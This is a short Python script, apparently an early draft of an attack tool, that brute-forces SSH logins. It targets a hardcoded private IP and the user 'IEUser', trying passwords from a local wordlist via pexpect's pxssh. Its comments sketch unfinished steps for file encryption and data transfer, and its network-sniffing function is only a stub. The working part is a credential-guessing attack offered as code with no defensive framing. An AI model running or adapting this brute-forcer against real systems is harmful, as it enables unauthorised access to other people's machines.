

=======
#!/usr/bin/env python3

import smtplib
from pexpect import pxssh
import time


#play video

#def encrypt file

#sniff network
def sniffNetwork():
    ipAddress= '192.168.0.49'
    return ipAddress

#bruteforce
def bruteForce(user, ipAddress):
    filepath =open("./passwordlist.txt")
    for i in filepath.readlines():
        secret=i.strip("\n")
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            return secret
            # break   
        except pxssh.ExceptionPxssh as e:
            time.sleep(1)

#Transfer


def main():
    user= "IEUser"
    ipAddress= sniffNetwork()
    print(ipAddress)
    password=bruteForce(user,ipAddress)

main()

